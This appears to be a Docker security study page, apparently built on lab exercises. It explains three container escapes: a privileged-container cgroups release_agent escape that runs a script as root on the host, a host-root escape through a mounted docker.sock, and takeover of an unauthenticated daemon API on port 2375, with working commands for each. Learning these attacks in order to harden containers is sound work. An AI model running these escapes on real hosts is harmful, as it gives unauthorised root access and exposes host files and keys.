# Docker — Security

Docker's isolation is process/filesystem-level, not full hardware virtualization, so misconfiguration can let an attacker break out of a container and reach the host — sometimes as root. This page covers three real container-escape / RCE paths and links to reference material.

!!! tip "Reference material"
    - Checklist for container security: [Docker Security — OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)
    - Docker vulnerability scanner tool: [elliotsecops/Docker-Security-Scanner](https://github.com/elliotsecops/Docker-Security-Scanner)

## Vulnerability #1: Privileged containers

!!! warning "Container escape via cgroups release_agent"
    Normally you can't escape a container to reach the host OS. The exception is a **privileged** container: the `--privileged` flag lets the container interact directly with the host kernel, which opens the door to a classic cgroups `release_agent` escape.

The escape abuses the Linux `release_agent` mechanism: a cgroup can be configured to run an arbitrary script on the host once the cgroup becomes empty.

1. Create a temporary directory and mount the host's cgroup filesystem into it:

    ```bash
    mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
    ```

2. Tell the kernel to run the `release_agent` script whenever this cgroup becomes empty:

    ```bash
    echo 1 > /tmp/cgrp/x/notify_on_release
    ```

3. Extract the host path where the container's filesystem is mounted, and point `release_agent` at a script inside it:

    ```bash
    echo "$host_path/exploit" > /tmp/cgrp/release_agent
    ```

4. Create `/exploit` inside the container (it will be accessible from the host at `$host_path/exploit`). The script reads a target file from the host and copies it back into the container's filesystem:

    ```bash
    echo '#!/bin/sh' > /exploit
    echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
    chmod a+x /exploit
    ```

5. Move the current shell's PID into the cgroup. When the shell exits, the cgroup becomes empty, which triggers `release_agent` — **the kernel then runs the script on the host, as root:**

    ```bash
    sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
    ```

## Vulnerability #2: Escaping via an exposed Docker socket

!!! warning "Mounting /var/run/docker.sock into a container is equivalent to giving it root on the host"
    `/var/run/docker.sock` is the Unix socket that controls the Docker Engine — a fast, filesystem-based alternative to a network socket. Any process that can write to it can control Docker itself, and by extension, the host.

The fatal mistake is running a container with the host's Docker socket bind-mounted in:

```bash
# Docker run command that creates this vulnerability:
docker run -v /var/run/docker.sock:/var/run/docker.sock ...
```

**Phase 1 — discovery.** From inside the container, check whether you're in the `docker` group and whether the socket is reachable:

```bash
# Check if you're in the docker group
groups  # should show "docker" in the output

# Locate the Docker socket
ls -la /var/run | grep sock
# Output: srw-rw---- 1 root docker 0 Dec 9 19:37 docker.sock
```

The permission bits (`srw-rw----`, group-writable) confirm you have write access to the socket.

**Phase 2 — the exploit.** With socket access, you can ask the Docker Engine to start a *new* container that mounts the entire host filesystem:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

| Command part | What it does | Why it's dangerous |
|---|---|---|
| `docker run` | Creates a new container | You're controlling Docker from inside a container |
| `-v /:/mnt` | Mounts the host's **entire** filesystem | Host `/` becomes available at container `/mnt` |
| `--rm` | Auto-deletes the container on exit | Leaves no trace |
| `-it` | Interactive + pseudo-TTY | Gives you a shell |
| `alpine` | Tiny (~5MB) Linux image | Common on systems, easy to blend in |
| `chroot /mnt sh` | Changes root to the mounted host filesystem | Makes the host filesystem appear as the container's own root |

**Why it works — the trust chain breaks down at two points:**

- **Docker's security model assumes** anyone with access to the socket is trusted — but the socket is just a file, so file permissions are the *only* thing gating that trust.
- **Mount propagation + `chroot`** compound the problem: once the host's `/` is mounted at `/mnt` in the new container, `chroot /mnt` makes that mount *become* the container's root. Paths that used to be `/mnt/etc/passwd` or `/mnt/root/.ssh` are now just `/etc/passwd` and `/root/.ssh` — i.e. the host's password file and SSH keys, directly.

## Vulnerability #3: RCE via an exposed Docker daemon API

!!! warning "Docker Engine listening on TCP without authentication is complete host compromise"
    Docker Engine can be configured to listen on TCP port **2375** (unencrypted) or **2376** (TLS). If port 2375 is exposed without authentication — a common misconfiguration in CI/CD and dev environments — anyone who can reach it can control Docker, and therefore the host.

**Enumeration.** Scan for the Docker port and confirm the API responds:

```bash
# Quick scan for Docker port
nmap -sV -p 2375 10.67.182.123

# Output shows:
# 2375/tcp open docker Docker 20.10.20 (API 1.41)
```

```bash
# Test connection using curl
curl http://10.67.182.123:2375/version
```

```json
{
  "Platform": {
    "Name": "Docker Engine - Community"
  },
  "Components": [
    {
      "Name": "Engine",
      "Version": "20.10.20"
    }
  ]
}
```

Further enumeration via the raw API:

```bash
# Check the Docker info endpoint
curl http://10.67.182.123:2375/info

# List containers via the API
curl http://10.67.182.123:2375/containers/json

# With nicer formatting
curl -s http://10.67.182.123:2375/containers/json | jq .
```

**Exploitation.** Point the Docker CLI itself at the remote, unauthenticated daemon:

```bash
# Set Docker host to target
export DOCKER_HOST=tcp://10.67.182.123:2375

# Or use -H per command
docker -H tcp://10.67.182.123:2375 ps
```

From there, normal reconnaissance commands work against the remote host's Docker Engine as if it were local:

```bash
# List running containers
docker -H tcp://10.67.182.123:2375 ps

# List ALL containers (including stopped)
docker -H tcp://10.67.182.123:2375 ps -a

# List Docker networks (pivoting opportunities)
docker -H tcp://10.67.182.123:2375 network ls

# List available images
docker -H tcp://10.67.182.123:2375 images
```
